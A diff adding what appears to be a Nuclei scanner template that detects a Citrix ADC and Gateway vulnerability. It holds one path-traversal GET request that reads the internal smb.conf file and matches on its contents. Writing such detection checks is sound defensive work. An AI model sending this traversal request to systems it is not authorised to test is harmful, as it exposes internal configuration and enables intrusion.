@@ -1,0 +1,20 @@
+id: citrix-adc-gateway-rce
+info:
+  name: Citrix ADC and Gateway Remote Code Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,citrix
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/vpn/../vpns/cfg/smb.conf"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "encrypt passwords ="
+      - type: word
+        part: body
+        words:
+          - "[global]"
